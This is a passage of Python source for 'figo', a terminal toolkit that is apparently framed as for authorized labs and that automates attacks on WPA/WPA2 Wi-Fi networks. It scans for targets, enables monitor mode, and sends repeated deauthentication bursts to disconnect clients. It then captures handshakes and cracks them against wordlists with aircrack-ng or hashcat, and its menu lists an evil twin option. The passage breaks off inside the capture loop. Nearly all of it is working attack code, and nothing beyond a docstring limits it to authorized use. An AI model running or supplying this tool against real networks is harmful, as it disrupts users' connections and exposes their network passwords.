#!/usr/bin/env python3
"""figo— A terminal-based Wi-Fi security testing toolkit for authorized lab environments."""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Confirm, Prompt
from rich.table import Table

console = Console()


class BackToMenu(Exception):
    """Ctrl+C in a submenu returns to the main menu."""

APP_NAME = "figo"
TOOL_DIR = Path(__file__).resolve().parent
DEFAULT_HANDSHAKE_DIR = str(TOOL_DIR / "handshakes")
CAPTURE_TIMEOUT_SEC = 90
DEAUTH_COUNT = 5
DEAUTH_BURSTS = 8
DEAUTH_GAP_SEC = 8
AIRODUMP_WARMUP_SEC = 4
TOOL_PACKAGES = {
    "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "cowpatty": "cowpatty",
    "iw": "iw",
    "nmcli": "network-manager",
    "hashcat": "hashcat",
    "hcxpcapngtool": "hcxtools",
    "hostapd": "hostapd",
    "dnsmasq": "dnsmasq",
    "ip": "iproute2",
}
REQUIRED_BINS = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")
OPTIONAL_BINS = (
    "cowpatty",
    "iw",
    "nmcli",
    "hashcat",
    "hcxpcapngtool",
    "hostapd",
    "dnsmasq",
    "ip",
)


def effective_home() -> Path:
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user and os.geteuid() == 0:
        home = Path("/home") / sudo_user
        if home.is_dir():
            return home
    return Path.home()


CONFIG_DIR = effective_home() / ".config" / APP_NAME
CONFIG_FILE = CONFIG_DIR / "config.json"
COMMON_WORDLIST_DIRS = [
    Path("/usr/share/wordlists"),
    Path("/usr/share/seclists/Passwords"),
    effective_home() / "wordlists",
]


@dataclass
class Target:
    ssid: str = ""
    bssid: str = ""
    channel: str = ""
    signal: str = ""
    security: str = ""


@dataclass
class Settings:
    interface: str = ""
    wordlist: str = ""
    handshake_dir: str = DEFAULT_HANDSHAKE_DIR
    target: Target = field(default_factory=Target)
    portal: dict = field(default_factory=dict)


def load_settings() -> Settings:
    if not CONFIG_FILE.exists():
        return Settings()
    try:
        raw = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        target_raw = raw.get("target", {}) or {}
        target = Target(
            ssid=str(target_raw.get("ssid", "") or ""),
            bssid=str(target_raw.get("bssid", "") or ""),
            channel=str(target_raw.get("channel", "") or ""),
            signal=str(target_raw.get("signal", "") or ""),
            security=str(target_raw.get("security", "") or ""),
        )
        portal_raw = raw.get("portal", {}) or {}
        if not isinstance(portal_raw, dict):
            portal_raw = {}
        return Settings(
            interface=raw.get("interface", ""),
            wordlist=raw.get("wordlist", ""),
            handshake_dir=raw.get("handshake_dir") or DEFAULT_HANDSHAKE_DIR,
            target=target,
            portal=portal_raw,
        )
    except (OSError, json.JSONDecodeError, TypeError):
        return Settings()


def save_settings(settings: Settings) -> None:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    portal = settings.portal
    if hasattr(portal, "to_dict"):
        portal = portal.to_dict()
    elif not isinstance(portal, dict):
        portal = {}
    payload = {
        "interface": settings.interface,
        "wordlist": settings.wordlist,
        "handshake_dir": settings.handshake_dir or DEFAULT_HANDSHAKE_DIR,
        "target": asdict(settings.target),
        "portal": portal,
    }
    CONFIG_FILE.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")


def ask(message: str, *, default: str = "", exit_on_interrupt: bool = False) -> str:
    try:
        return Prompt.ask(f"{message}", default=default, show_default=False)
    except KeyboardInterrupt:
        if exit_on_interrupt:
            raise
        raise BackToMenu from None


def confirm(message: str, *, default: bool = False) -> bool:
    try:
        return Confirm.ask(message, default=default)
    except KeyboardInterrupt:
        raise BackToMenu from None


def pause(message: str = "Press Enter to go back...") -> None:
    ask(f"[dim]{message}[/dim]")


def warn_and_back(title: str, body: str) -> None:
    console.print()
    console.print(
        Panel(
            body,
            title=f"[bold red]Warning[/bold red] · {title}",
            border_style="red",
            box=box.ROUNDED,
        )
    )
    pause()


def wireless_interfaces() -> list[str]:
    ifaces: list[str] = []
    net = Path("/sys/class/net")
    if net.exists():
        for entry in sorted(net.iterdir()):
            if (entry / "wireless").exists() or (entry / "phy80211").exists():
                ifaces.append(entry.name)
    if ifaces:
        return ifaces

    iw = shutil.which("iw")
    if not iw:
        return []
    try:
        out = subprocess.check_output([iw, "dev"], text=True, stderr=subprocess.DEVNULL)
    except (OSError, subprocess.CalledProcessError):
        return []
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Interface "):
            current = stripped.split(None, 1)[1]
            if current:
                ifaces.append(current)
    return ifaces


def iface_state(name: str) -> str:
    oper = Path(f"/sys/class/net/{name}/operstate")
    if oper.exists():
        try:
            return oper.read_text(encoding="utf-8").strip()
        except OSError:
            return "?"
    return "?"


def nmcli_split(line: str) -> list[str]:
    parts: list[str] = []
    buf: list[str] = []
    escaped = False
    for ch in line:
        if escaped:
            buf.append(ch)
            escaped = False
        elif ch == "\\":
            escaped = True
        elif ch == ":":
            parts.append("".join(buf))
            buf = []
        else:
            buf.append(ch)
    parts.append("".join(buf))
    return parts


def scan_networks(interface: str) -> tuple[list[dict[str, str]], Optional[str]]:
    nmcli = shutil.which("nmcli")
    if nmcli:
        cmd = [
            nmcli,
            "-g",
            "SSID,BSSID,CHAN,SIGNAL,SECURITY",
            "device",
            "wifi",
            "list",
            "ifname",
            interface,
            "--rescan",
            "yes",
        ]
        try:
            out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
            rows: list[dict[str, str]] = []
            seen: set[str] = set()
            for line in out.splitlines():
                if not line.strip():
                    continue
                parts = nmcli_split(line)
                if len(parts) < 5:
                    continue
                ssid, bssid, channel, signal, security = parts[:5]
                key = bssid.upper() or ssid
                if key in seen:
                    continue
                seen.add(key)
                rows.append(
                    {
                        "ssid": ssid or "<hidden>",
                        "bssid": bssid,
                        "channel": channel,
                        "signal": signal,
                        "security": security or "-",
                    }
                )
            rows.sort(key=lambda r: int(r["signal"] or "0"), reverse=True)
            return rows, None
        except subprocess.CalledProcessError as exc:
            err = (exc.output or str(exc)).strip()
            return [], err or "Scan failed (nmcli)"

    iw = shutil.which("iw")
    if not iw:
        return [], "No scan tool available (nmcli or iw)"
    try:
        out = subprocess.check_output(
            [iw, "dev", interface, "scan"],
            text=True,
            stderr=subprocess.STDOUT,
        )
    except subprocess.CalledProcessError as exc:
        err = (exc.output or str(exc)).strip()
        return [], err or "Scan failed (iw). You may need elevated privileges."

    rows = []
    current: dict[str, str] = {}
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("BSS ") and s[4:21].count(":") == 5:
            if current.get("bssid"):
                rows.append(current)
            bssid = s[4:21].split()[0]
            current = {
                "ssid": "<hidden>",
                "bssid": bssid,
                "channel": "-",
                "signal": "0",
                "security": "-",
            }
        elif s.startswith("SSID:"):
            ssid = s.split("SSID:", 1)[1].strip()
            current["ssid"] = ssid or "<hidden>"
        elif s.startswith("signal:"):
            try:
                dbm = float(s.split()[1])
                current["signal"] = str(max(0, min(100, int(2 * (dbm + 100)))))
            except (IndexError, ValueError):
                pass
        elif "DS Parameter set: channel" in s:
            current["channel"] = s.rsplit(" ", 1)[-1]
    if current.get("bssid"):
        rows.append(current)
    rows.sort(key=lambda r: int(r["signal"] or "0"), reverse=True)
    return rows, None


def discover_wordlists(limit: int = 12) -> list[Path]:
    found: list[Path] = []
    for folder in COMMON_WORDLIST_DIRS:
        if not folder.is_dir():
            continue
        for path in sorted(folder.rglob("*")):
            if path.is_file() and path.stat().st_size > 0:
                found.append(path)
            if len(found) >= limit:
                return found
    return found


def wordlist_info(path: Path) -> str:
    try:
        size = path.stat().st_size
        if size < 1024:
            size_s = f"{size} B"
        elif size < 1024 * 1024:
            size_s = f"{size / 1024:.1f} KB"
        else:
            size_s = f"{size / (1024 * 1024):.1f} MB"
        lines = 0
        with path.open("rb") as fh:
            for lines, _ in enumerate(fh, 1):
                if lines >= 5_000_000:
                    return f"{size_s} · 5M+ lines"
        return f"{size_s} · {lines:,} lines"
    except OSError:
        return "Unable to read file"


def clear_screen() -> None:
    console.clear()


def is_wpa3(security: str) -> bool:
    low = (security or "").lower()
    if "wpa2" in low and "wpa3" not in low and "sae" not in low:
        return False
    return "wpa3" in low or "sae" in low


def menu_value(text: str, set_: bool) -> str:
    if set_ and text:
        return f"[bold green]{text}[/bold green]"
    return "[dim]not set[/dim]"


def render_banner(settings: Settings) -> None:
    return


def render_menu(settings: Settings) -> None:
    adapter = menu_value(settings.interface, bool(settings.interface))
    if settings.target.ssid:
        target_label = settings.target.ssid
        if settings.target.bssid:
            target_label = f"{settings.target.ssid}  ({settings.target.bssid})"
        if is_wpa3(settings.target.security):
            target = f"{menu_value(target_label, True)} [yellow]WPA3[/yellow]"
        else:
            target = menu_value(target_label, True)
    else:
        target = menu_value("", False)
    word = menu_value(Path(settings.wordlist).name if settings.wordlist else "", bool(settings.wordlist))

    table = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
    table.add_column("key", style="bold yellow", width=4)
    table.add_column("label")
    table.add_column("value", justify="right", overflow="ellipsis", no_wrap=True)
    missing_n = len(missing_bins())
    tools_status = (
        f"[yellow]{missing_n} missing[/yellow]" if missing_n else "[bold green]all OK[/bold green]"
    )
    table.add_row("", "[bold]Setup[/bold]", "requirment")
    table.add_row("1", "Select a network adapter", adapter)
    table.add_row("2", "Discover networks and select a test target", target)
    table.add_row("3", "Select a password wordlist file", word)
    table.add_row("4", "Show current settings", "")
    table.add_row("5", "Check / install tools", tools_status)
    table.add_row("--", "[bold][red]------------------------[/red][/bold]", "")
    table.add_row("", "[bold]Run[/bold]", "")
    table.add_row("6", "Capture handshake", "")
    table.add_row("7", "Crack a saved handshake", "")
    table.add_row("8", "Evil Twin Lab", "")
    console.print(Panel(table, title="Main menu", subtitle="Ctrl+C to exit", border_style="green", box=box.ROUNDED))


def require_interface(settings: Settings) -> bool:
    if settings.interface:
        return True
    warn_and_back(
        "Network adapter required",
        "No network adapter is selected yet.\n"
        "Choose [bold]1 — Select a network adapter[/bold] from the menu,\n"
        "then try again.",
    )
    return False


def which_or_none(*names: str) -> Optional[str]:
    for name in names:
        path = shutil.which(name)
        if path:
            return path
    return None


def missing_bins(names: tuple[str, ...] | None = None) -> list[str]:
    check = names if names is not None else REQUIRED_BINS + OPTIONAL_BINS
    return [name for name in check if not which_or_none(name)]


def packages_for(bins: list[str]) -> list[str]:
    pkgs: list[str] = []
    for name in bins:
        pkg = TOOL_PACKAGES.get(name, name)
        if pkg not in pkgs:
            pkgs.append(pkg)
    return pkgs


def require_bins(names: tuple[str, ...]) -> bool:
    missing = missing_bins(names)
    if not missing:
        return True
    pkgs = packages_for(missing)
    warn_and_back(
        "Missing tools",
        "These commands are not installed:\n"
        + ", ".join(f"[bold]{n}[/bold]" for n in missing)
        + "\n\nChoose [bold]5 — Check / install tools[/bold] to install:\n"
        + ", ".join(pkgs),
    )
    return False


def action_install_tools() -> None:
    if not ensure_root("install"):
        return

    clear_screen()
    render_banner(load_settings())
    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("Command")
    table.add_column("Package")
    table.add_column("Need")
    table.add_column("Status")
    for name in REQUIRED_BINS + OPTIONAL_BINS:
        found = which_or_none(name)
        need = "required" if name in REQUIRED_BINS else "optional"
        status = f"[bold green]{found}[/bold green]" if found else "[yellow]missing[/yellow]"
        table.add_row(name, TOOL_PACKAGES[name], need, status)
    console.print(Panel(table, title="Tool check", border_style="cyan"))

    missing = missing_bins()
    if not missing:
        console.print("\n[green]All tools are installed.[/green]")
        pause()
        return

    pkgs = packages_for(missing)
    apt = which_or_none("apt-get")
    if not apt:
        warn_and_back(
            "No apt-get",
            "Could not find apt-get. Install these packages with your package manager:\n"
            + " ".join(pkgs),
        )
        return

    console.print(f"\nMissing packages: [bold]{' '.join(pkgs)}[/bold]\n")
    if not confirm("Install with apt-get now?", default=True):
        return

    env = os.environ.copy()
    env["DEBIAN_FRONTEND"] = "noninteractive"
    console.print("\n[dim]apt-get update...[/dim]")
    update = subprocess.run([apt, "update"], env=env)
    console.print("\n[dim]apt-get install -y " + " ".join(pkgs) + "...[/dim]\n")
    install = subprocess.run([apt, "install", "-y", *pkgs], env=env)
    if update.returncode != 0 or install.returncode != 0:
        warn_and_back(
            "Install failed",
            "apt-get reported an error. Fix the package manager, then try option 5 again.",
        )
        return

    still = missing_bins()
    if still:
        warn_and_back(
            "Still missing",
            "Installed packages, but these commands are still not on PATH:\n"
            + ", ".join(still),
        )
        return

    console.print("\n[green]All tools are now installed.[/green]")
    pause()


def run_cmd(cmd: list[str], timeout: int = 60) -> tuple[int, str]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = ((proc.stdout or "") + (proc.stderr or "")).strip()
        return proc.returncode, out
    except FileNotFoundError:
        return 127, f"Command not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 1, f"Timed out after {timeout}s: {' '.join(cmd)}"


def ensure_root(resume: str) -> bool:
    if os.geteuid() == 0:
        return True
    sudo = which_or_none("sudo")
    if not sudo:
        warn_and_back(
            "Root required",
            "This action needs root, and [bold]sudo[/bold] was not found.\n"
            "Run the tool as root, then try again.",
        )
        return False
    script = str(Path(__file__).resolve())
    console.print("\n[yellow]Root required — restarting with sudo...[/yellow]\n")
    try:
        os.execvp(
            sudo,
            [sudo, "-E", sys.executable, script, f"--resume={resume}"],
        )
    except OSError as exc:
        warn_and_back("sudo failed", str(exc))
    return False


def require_capture_ready(settings: Settings) -> bool:
    missing: list[str] = []
    if not settings.interface:
        missing.append("network adapter (menu 1)")
    if not settings.target.bssid:
        missing.append("test target BSSID (menu 2)")
    if not settings.target.channel or settings.target.channel in {"-", "?"}:
        missing.append("target channel (menu 2)")
    if missing:
        warn_and_back(
            "Settings incomplete",
            "Set the following, then try Capture again:\n\n"
            + "\n".join(f"• {item}" for item in missing),
        )
        return False
    return True


def require_wordlist(settings: Settings) -> bool:
    wordlist = Path(settings.wordlist) if settings.wordlist else None
    if wordlist and wordlist.is_file():
        return True
    warn_and_back(
        "Wordlist required",
        "No password wordlist is selected yet.\n"
        "Choose [bold]3 — Select a password wordlist file[/bold] from the menu,\n"
        "then try again.",
    )
    return False


def safe_filename(ssid: str) -> str:
    cleaned = "".join(c if c.isalnum() or c in "-_." else "_" for c in ssid).strip("._")
    return (cleaned[:40] or "target")


def iface_type(name: str) -> str:
    iw = which_or_none("iw")
    if not iw:
        return ""
    code, out = run_cmd([iw, "dev", name, "info"], timeout=10)
    if code != 0:
        return ""
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("type "):
            return stripped.split(None, 1)[1]
    return ""


def list_monitor_ifaces() -> list[str]:
    return [name for name in wireless_interfaces() if iface_type(name) == "monitor"]


def enable_monitor(iface: str, channel: str) -> tuple[Optional[str], str]:
    if iface_type(iface) == "monitor":
        return iface, f"{iface} is already in monitor mode"

    airmon = which_or_none("airmon-ng")
    if not airmon:
        return None, "airmon-ng was not found on PATH"

    before = set(wireless_interfaces())
    run_cmd([airmon, "check", "kill"], timeout=90)

    start_cmd = [airmon, "start", iface]
    if channel.isdigit():
        start_cmd.append(channel)
    code, out = run_cmd(start_cmd, timeout=60)
    if code != 0:
        return None, out or f"airmon-ng start {iface} failed"

    after = set(wireless_interfaces())
    created = sorted(after - before)
    monitors = list_monitor_ifaces()

    match = re.search(r"\b(\w+mon)\b", out)
    candidates: list[str] = []
    if match:
        candidates.append(match.group(1))
    candidates.extend(created)
    candidates.extend(monitors)
    candidates.append(iface)
    for candidate in candidates:
        if candidate and iface_type(candidate) == "monitor":
            return candidate, out

    if monitors:
        return monitors[0], out
    if created:
        return created[0], out
    return None, out or (
        "Could not enable monitor mode. "
        "This adapter (often Realtek) may lack monitor/injection support."
    )


def stop_monitor(mon: Optional[str], _base_iface: str) -> None:
    airmon = which_or_none("airmon-ng")
    if airmon and mon:
        run_cmd([airmon, "stop", mon], timeout=40)
    systemctl = which_or_none("systemctl")
    if systemctl:
        run_cmd([systemctl, "restart", "NetworkManager"], timeout=40)


def start_airodump(
    mon: str, bssid: str, channel: str, prefix: Path
) -> tuple[Optional[subprocess.Popen], Optional[str]]:
    airodump = which_or_none("airodump-ng")
    if not airodump:
        return None, "airodump-ng was not found on PATH"
    log_path = prefix.with_suffix(".airodump.log")
    log_fh = log_path.open("w", encoding="utf-8")
    cmd = [
        airodump,
        "--bssid",
        bssid,
        "-c",
        channel,
        "-w",
        str(prefix),
        "--output-format",
        "pcap",
        mon,
    ]
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
        )
    except OSError as exc:
        log_fh.close()
        return None, str(exc)
    proc._figo_log = log_fh  # type: ignore[attr-defined]
    return proc, None


def stop_airodump(proc: Optional[subprocess.Popen]) -> None:
    if proc is None:
        return
    log_fh = getattr(proc, "_figo_log", None)
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
    if log_fh:
        try:
            log_fh.close()
        except OSError:
            pass


def run_deauth(mon: str, bssid: str, count: int = DEAUTH_COUNT) -> tuple[int, str]:
    aireplay = which_or_none("aireplay-ng")
    if not aireplay:
        return 127, "aireplay-ng was not found on PATH"
    return run_cmd(
        [aireplay, "--deauth", str(count), "-a", bssid, "-D", mon],
        timeout=30,
    )


def test_injection(mon: str) -> tuple[bool, str]:
    aireplay = which_or_none("aireplay-ng")
    if not aireplay:
        return False, "aireplay-ng was not found on PATH"
    code, out = run_cmd([aireplay, "-9", "-D", mon], timeout=25)
    low = out.lower()
    if "injection is working" in low:
        return True, out
    if "injection is not working" in low:
        return False, out or "Injection is not working on this adapter"
    if code == 0 and "inject" in low:
        return True, out
    return False, out or "Injection test failed (adapter may lack packet injection)"


def format_bytes(size: int) -> str:
    if size < 1024:
        return f"{size} B"
    if size < 1024 * 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size / (1024 * 1024):.1f} MB"


def cap_size_label(capfile: Optional[Path]) -> str:
    if not capfile or not capfile.exists():
        return "0 B"
    try:
        return format_bytes(capfile.stat().st_size)
    except OSError:
        return "?"


def render_capture_progress(
    elapsed: float,
    timeout: int,
    burst: int,
    captured: bool,
    capfile: Optional[Path],
    note: str,
) -> Panel:
    remaining = max(0, int(timeout - elapsed))
    pct = 0.0 if timeout <= 0 else min(1.0, elapsed / timeout)
    width = 32
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    hs = "[bold green]YES[/bold green]" if captured else "[yellow]waiting[/yellow]"
    cap_name = capfile.name if capfile else "—"
    table = Table.grid(padding=(0, 1), expand=True)
    table.add_column(style="bold", width=12)
    table.add_column()
    table.add_row("Time", f"{int(elapsed):>3}s / {timeout}s   ({remaining}s left)")
    table.add_row("Progress", f"[cyan]{bar}[/cyan]  {int(pct * 100)}%")
    table.add_row("Deauth", f"burst {min(burst, DEAUTH_BURSTS)}/{DEAUTH_BURSTS}")
    table.add_row("Handshake", hs)
    table.add_row("Capture", f"{cap_name}  ({cap_size_label(capfile)})")
    table.add_row("Status", note)
    return Panel(table, title="Capture progress", border_style="cyan", box=box.ROUNDED)


def latest_cap(prefix: Path) -> Optional[Path]:
    caps = list(prefix.parent.glob(prefix.name + "-*.cap"))
    caps += list(prefix.parent.glob(prefix.name + "-*.pcap"))
    if not caps:
        return None
    caps.sort(key=lambda p: p.stat().st_mtime)
    return caps[-1]


def handshake_captured(capfile: Path, bssid: str) -> bool:
    if not capfile.exists() or capfile.stat().st_size < 24:
        return False

    cowpatty = which_or_none("cowpatty")
    if cowpatty:
        _code, out = run_cmd([cowpatty, "-c", "-r", str(capfile)], timeout=20)
        low = out.lower()
        if "incomplete" not in low and (
            "collected all necessary data" in low or "wpa handshake" in low
        ):
            return True

    aircrack = which_or_none("aircrack-ng")
    if aircrack:
        _code, out = run_cmd([aircrack, "-a2", "-b", bssid, str(capfile)], timeout=8)
        low = out.lower()
        if "no valid wpa handshakes" in low:
            return False
        if re.search(r"[1-9]\d*\s+handshake", low):
            return True
        if "handshake" in low and "0 handshake" not in low:
            return True
    return False


def list_cap_files(folder: Path) -> list[Path]:
    if not folder.is_dir():
        return []
    caps = [p for p in folder.iterdir() if p.is_file() and p.suffix.lower() in {".cap", ".pcap"}]
    caps.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    return caps


def networks_in_cap(capfile: Path) -> list[dict[str, str]]:
    aircrack = which_or_none("aircrack-ng")
    if not aircrack:
        return []
    _code, out = run_cmd([aircrack, str(capfile)], timeout=12)
    rows: list[dict[str, str]] = []
    for line in out.splitlines():
        match = re.search(
            r"^\s*(\d+)\s+([0-9A-Fa-f:]{17})\s+(.*?)\s+WPA[^\n]*handshake",
            line,
        )
        if not match:
            continue
        rows.append(
            {
                "index": match.group(1),
                "bssid": match.group(2),
                "ssid": match.group(3).strip() or "<hidden>",
                "line": line.strip(),
            }
        )
    return rows


def show_crack_result(key: Optional[str], capfile: Path) -> None:
    if key:
        console.print(
            Panel(
                f"KEY FOUND: [bold green]{key}[/bold green]\n\nCapture: {capfile}",
                title="Result",
                border_style="green",
                box=box.ROUNDED,
            )
        )
        return
    console.print(
        Panel(
            "No key found in the selected wordlist.\n"
            f"Handshake kept at:\n{capfile}",
            title="Result",
            border_style="yellow",
            box=box.ROUNDED,
        )
    )


def crack_capture(capfile: Path, bssid: str, wordlist: str) -> tuple[Optional[str], str]:
    aircrack = which_or_none("aircrack-ng")
    if not aircrack:
        return None, "aircrack-ng was not found on PATH"

    cmd = [aircrack, "-a2", "-w", wordlist, str(capfile)]
    if bssid:
        cmd = [aircrack, "-a2", "-b", bssid, "-w", wordlist, str(capfile)]
    console.print(f"[dim]$ {' '.join(cmd)}[/dim]\n")
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except OSError as exc:
        return None, str(exc)

    collected: list[str] = []
    found: Optional[str] = None
    assert proc.stdout is not None
    try:
        for line in proc.stdout:
            text = line.rstrip("\n")
            collected.append(text)
            console.print(text)
            match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", text)
            if match:
                found = match.group(1)
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        raise BackToMenu from None
    output = "\n".join(collected)
    if found:
        return found, output
    if proc.returncode != 0 and not output:
        return None, "aircrack-ng exited with an error"
    return None, output


def cap_to_hc22000(capfile: Path) -> tuple[Optional[Path], str]:
    tool = which_or_none("hcxpcapngtool")
    if not tool:
        return None, "hcxpcapngtool was not found (package: hcxtools)"
    out = capfile.with_suffix(".hc22000")
    code, text = run_cmd([tool, "-o", str(out), str(capfile)], timeout=60)
    if not out.exists() or out.stat().st_size == 0:
        return None, text or "Conversion produced an empty .hc22000 file"
    return out, text


def read_hashcat_plain(path: Path) -> Optional[str]:
    if not path.exists():
        return None
    try:
        text = path.read_text(encoding="utf-8", errors="replace").strip()
    except OSError:
        return None
    if not text:
        return None
    last = text.splitlines()[-1].strip()
    if ":" in last:
        return last.rsplit(":", 1)[-1]
    return last


def crack_hashcat(hashfile: Path, wordlist: str) -> tuple[Optional[str], str]:
    hashcat = which_or_none("hashcat")
    if not hashcat:
        return None, "hashcat was not found on PATH"
    outfile = hashfile.with_suffix(".cracked")
    cmd = [
        hashcat,
        "-m",
        "22000",
        "-a",
        "0",
        "-D",
        "2",
        "--outfile",
        str(outfile),
        "--outfile-format",
        "2",
        "--status",
        str(hashfile),
        wordlist,
    ]
    console.print(f"[dim]$ {' '.join(cmd)}[/dim]\n")
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except OSError as exc:
        return None, str(exc)

    collected: list[str] = []
    assert proc.stdout is not None
    try:
        for line in proc.stdout:
            text = line.rstrip("\n")
            collected.append(text)
            console.print(text)
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        raise BackToMenu from None

    output = "\n".join(collected)
    found = read_hashcat_plain(outfile)
    if found:
        return found, output
    low = output.lower()
    if "cracked" in low:
        found = read_hashcat_plain(outfile)
        if found:
            return found, output
    if proc.returncode not in {0, 1} and not output:
        return None, "hashcat exited with an error"
    return None, output


def action_capture(settings: Settings) -> None:
    if not require_capture_ready(settings):
        return
    if is_wpa3(settings.target.security):
        warn_and_back(
            "WPA3 not supported",
            "The selected network uses WPA3/SAE.\n"
            "aircrack-ng handshake capture (-a2) does not apply to SAE.\n"
            "Pick a WPA/WPA2 target from menu [bold]2[/bold].",
        )
        return
    if not ensure_root("capture") or not require_bins(REQUIRED_BINS):
        return

    handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    try:
        handshake_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        warn_and_back("Handshake folder", f"Could not create {handshake_dir}:\n{exc}")
        return

    clear_screen()
    render_banner(settings)
    summary = Table(box=box.ROUNDED, expand=True, show_header=False)
    summary.add_column("k", style="bold", width=16)
    summary.add_column("v")
    summary.add_row("Adapter", settings.interface)
    summary.add_row("Target", f"{settings.target.ssid}  ({settings.target.bssid})")
    summary.add_row("Channel", settings.target.channel)
    sec = settings.target.security or "-"
    summary.add_row("Security", f"[yellow]{sec}[/yellow]" if is_wpa3(sec) else sec)
    summary.add_row("Handshake dir", str(handshake_dir))
    console.print(Panel(summary, title="Capture handshake", border_style="yellow"))
    console.print(
        "[yellow]Deauthentication will briefly disconnect clients on this access point "
        "so a WPA handshake can be captured.[/yellow]\n"
    )
    if not confirm("Continue?", default=False):
        return

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = handshake_dir / f"{safe_filename(settings.target.ssid)}_{stamp}"
    bssid = settings.target.bssid
    channel = settings.target.channel
    base_iface = settings.interface
    mon: Optional[str] = None
    dump_proc: Optional[subprocess.Popen] = None
    captured = False
    capfile: Optional[Path] = None
    restored = False

    try:
        console.print("\n[dim]Checking adapter: monitor mode...[/dim]")
        mon, mon_out = enable_monitor(base_iface, channel)
        if not mon:
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)
            restored = True
            warn_and_back(
                "Monitor mode failed",
                mon_out
                + "\n\nInternal Realtek adapters often lack monitor/injection support. "
                "A USB adapter with better aircrack-ng support may be required.",
            )
            return
        console.print(f"[green]Monitor interface:[/green] [bold]{mon}[/bold]")

        console.print("[dim]Checking adapter: packet injection...[/dim]")
        inject_ok, inject_out = test_injection(mon)
        if not inject_ok:
            last_lines = "\n".join(inject_out.splitlines()[-8:]) if inject_out else ""
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)
            restored = True
            warn_and_back(
                "Injection test failed",
                "This adapter cannot inject packets, so capture would likely stall.\n"
                "Stopped immediately instead of waiting for the timeout.\n\n"
                + (last_lines or "No output from aireplay-ng -9."),
            )
            return

        console.print("[green]Injection test passed.[/green]")

        dump_proc, dump_err = start_airodump(mon, bssid, channel, prefix)
        if dump_err or dump_proc is None:
            warn_and_back("Capture failed", dump_err or "airodump-ng did not start")
            return

        started = time.time()
        burst = 0
        last_hs_check = 0.0
        note = "Warming up airodump-ng..."
        with Live(
            render_capture_progress(0, CAPTURE_TIMEOUT_SEC, 0, False, None, note),
            console=console,
            refresh_per_second=4,
        ) as live:
            time.sleep(AIRODUMP_WARMUP_SEC)
            deadline = started + CAPTURE_TIMEOUT_SEC
            while time.time() < deadline:
                elapsed = time.time() - started
                capfile = latest_cap(prefix)
                live.update(
                    render_capture_progress(
                        elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                    )
                )

                if capfile and elapsed - last_hs_check >= 3:
                    note = "Checking for handshake..."
                    live.update(
                        render_capture_progress(
                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                        )
                    )
                    if handshake_captured(capfile, bssid):
                        captured = True
                        note = "Handshake captured"
                        live.update(
                            render_capture_progress(
                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                            )
                        )
                        break
                    last_hs_check = elapsed

                if captured:
                    break

                burst += 1
                if burst <= DEAUTH_BURSTS:
                    note = f"Deauth burst {burst}/{DEAUTH_BURSTS}"
                    live.update(
                        render_capture_progress(
                            time.time() - started,
                            CAPTURE_TIMEOUT_SEC,
                            burst,
                            captured,
                            capfile,
                            note,
                        )
                    )
                    code, out = run_deauth(mon, bssid)
                    if code != 0:
                        tail = out.splitlines()[-1] if out else str(code)
                        note = f"aireplay-ng warning: {tail}"
                else:
                    note = "Waiting for a client to reconnect..."

                gap_end = time.time() + DEAUTH_GAP_SEC
                while time.time() < gap_end and time.time() < deadline:
                    elapsed = time.time() - started
                    capfile = latest_cap(prefix)
                    live.update(
                        render_capture_progress(
                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                        )
                    )
                    if capfile and elapsed - last_hs_check >= 3:
                        note = "Checking for handshake..."
                        live.update(
                            render_capture_progress(
                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                            )
                        )
                        if handshake_captured(capfile, bssid):
                            captured = True
                            note = "Handshake captured"
                            live.update(
                                render_capture_progress(
                                    elapsed,
                                    CAPTURE_TIMEOUT_SEC,
